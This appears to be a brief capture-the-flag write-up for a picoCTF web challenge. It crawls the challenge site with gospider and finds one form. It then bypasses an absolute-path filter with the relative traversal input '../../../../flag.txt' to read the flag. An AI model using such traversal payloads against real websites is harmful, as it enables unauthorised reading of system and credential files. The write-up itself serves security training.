We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. 
Can you get past the filter to read the flag?

1) Using gospider
    (https://github.com/jaeles-project/gospider)

    [0000]  INFO Start crawling: http://saturn.picoctf.net:49700/
    [url] - [code-200] - http://saturn.picoctf.net:49700/
    [href] - http://saturn.picoctf.net:49700/style.css
    [form] - http://saturn.picoctf.net:49700/
    [0000]  INFO Done.


2) So the form is our only point of attack.
   Since the assig description states that `website is filtering absolute file paths`.
   Thus we needed to use the relative address (./)by typing:
   ../../../../flag.txt the filter is bypassed.
